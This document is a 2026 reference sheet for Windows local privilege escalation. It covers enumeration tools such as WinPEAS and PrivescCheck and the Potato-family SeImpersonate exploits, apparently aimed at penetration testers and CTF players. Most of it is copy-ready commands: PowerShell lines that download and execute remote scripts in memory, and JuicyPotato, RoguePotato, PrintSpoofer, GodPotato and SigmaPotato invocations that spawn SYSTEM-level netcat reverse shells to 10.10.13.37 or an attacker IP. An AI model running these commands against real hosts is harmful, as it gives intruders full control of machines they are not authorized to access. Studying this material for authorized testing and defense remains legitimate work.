# Windows Privilege Escalation — Enumeration Scripts & Potato-Family Exploits

*Local Windows privesc tooling reference (2026). For authorized penetration testing / CTF use only.*

---

## 1. Enumeration Scripts

### WinPEAS (PEASS-ng) — primary automated enumeration tool
Repo moved to the `peass-ng` GitHub org; ships as `.exe` (x86/x64), `.bat`, and `.ps1` variants.
```cmd
certutil -urlcache -split -f https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe winpeas.exe
:: or
powershell -c "Invoke-WebRequest https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile winPEASx64.exe"

.\winPEASx64.exe                        :: all checks
.\winPEASx64.exe systeminfo userinfo    :: specific checks only
.\winPEASx64.exe notcolor cmd log=peas.txt   :: no color, log to file
```
**Reference:** https://github.com/peass-ng/PEASS-ng

### Seatbelt (GhostPack) — C# host-survey tool
Complements rather than replaces PEAS-style tools — surfaces raw host data for manual review rather than flagging exploit paths itself.
```cmd
Seatbelt.exe -group=all
Seatbelt.exe AntiVirus TokenPrivileges -full
```
**Reference:** https://github.com/GhostPack/Seatbelt

### PowerUp (legacy) / PrivescCheck (actively maintained successor)
PowerUp (PowerSploit) is unmaintained but still functions on older builds and is still widely taught. PrivescCheck (itm4n) is the modern equivalent with report generation.
```powershell
# PowerUp
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"

# PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
```
**Reference:** https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc · https://github.com/itm4n/PrivescCheck

### SharpUp — C# port of PowerUp's read-only checks
Useful where PowerShell is blocked/logged. Ports enumeration checks only, not the weaponization functions.
```cmd
SharpUp.exe audit
SharpUp.exe UnquotedServicePath ModifiableServices TokenPrivileges
```
**Reference:** https://github.com/GhostPack/SharpUp

### Sherlock / JAWS — legacy, low value on patched hosts
Sherlock hunts missing-KB patch gaps for specific named CVEs (MS10-015 through CVE-2017-7199) — mostly obsolete against any host patched since 2018, but still occasionally relevant on deliberately outdated lab/practice boxes. JAWS targets PowerShell 2.0 / Windows 7+ and is superseded by WinPEAS/PrivescCheck for real engagements.
```powershell
# Sherlock
powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1'); Find-AllVulns"

# JAWS
powershell -ep bypass -File .\jaws-enum.ps1
```
**Reference:** https://github.com/rasta-mouse/Sherlock · https://github.com/411Hall/JAWS

---

## 2. Potato-Family Local Privilege Escalation (SeImpersonate/SeAssignPrimaryToken abuse)

Compatibility matrix (2026) — Microsoft hardened the OXID resolver in Windows 10 1809 / Server 2019, killing the older variants:

| Exploit | Works on | Broken on | Why |
|---|---|---|---|
| RottenPotato / RottenPotatoNG | Win 7/8/10 pre-1809, Server 2008R2–2012R2 | Win10 1809+/Server 2019+ | Relied on local COM listener MiTM (127.0.0.1:6666), superseded |
| JuicyPotato | Win10 up to 1803, Server up to 2016 | Win10 1809+, Server 2019+/2022, Win11 | MS restricted the OXID resolver to only accept callbacks on port 135 |
| RoguePotato | Win10 1809+, Server 2019/2022 | — (needs outbound TCP/135 to attacker or a socat redirector) | Reimplements the OXID resolver externally to route around the port-135 restriction |
| PrintSpoofer | Win10, Server 2016/2019 (SeImpersonate contexts) | Hosts with Print Spooler disabled (common post-PrintNightmare hardening) | Abuses Print Spooler named-pipe impersonation; repo archived Sept 2024 (read-only) but binary still works |
| GodPotato | Server 2012–2022, Win8–11 | None reported as of 2026 — broadest current compatibility | Abuses an RPCSS OXID-resolution defect independent of the 1809 port-135 fix |
| SigmaPotato | Win8–11, Server 2012–2022 (same engine as GodPotato) | Same as GodPotato | Fork adding in-memory/.NET-reflection execution + built-in revshell |

**JuicyPotato** (legacy targets only, Server ≤2016 / Win10 ≤1803):
```cmd
JuicyPotato.exe -t * -p c:\windows\system32\cmd.exe -a "/c whoami > C:\out.txt" -l 1337
```

**RoguePotato** (needs a redirector when no direct route to attacker:135):
```bash
# attacker/pivot box
socat tcp-listen:135,reuseaddr,fork tcp:<ATTACKER_IP>:9999
```
```cmd
:: target
RoguePotato.exe -r <ATTACKER_IP> -e "C:\windows\system32\cmd.exe" -l 9999
```

**PrintSpoofer** (Print Spooler running + SeImpersonate held):
```cmd
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
```

**GodPotato** (broadest current compatibility, Server 2012–2022 / Win8–11):
```cmd
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "cmd /c C:\Windows\Temp\nc.exe 10.10.13.37 4444 -e cmd.exe"
```

**SigmaPotato** (GodPotato fork, in-memory/reflection load, built-in revshell):
```cmd
SigmaPotato.exe "whoami"
SigmaPotato.exe --revshell <ATTACKER_IP> <PORT>
```

## Tools Reference

| Name | URL |
|---|---|
| WinPEAS (PEASS-ng) | https://github.com/peass-ng/PEASS-ng |
| Seatbelt | https://github.com/GhostPack/Seatbelt |
| PowerUp | https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc |
| PrivescCheck | https://github.com/itm4n/PrivescCheck |
| Sherlock | https://github.com/rasta-mouse/Sherlock |
| SharpUp | https://github.com/GhostPack/SharpUp |
| JAWS | https://github.com/411Hall/JAWS |
| JuicyPotato | https://github.com/ohpe/juicy-potato |
| RoguePotato | https://github.com/antonioCoco/RoguePotato |
| PrintSpoofer | https://github.com/itm4n/PrintSpoofer |
| GodPotato | https://github.com/BeichenDream/GodPotato |
| SigmaPotato | https://github.com/tylerdotrar/SigmaPotato |
| HackTricks Potato reference | https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html |
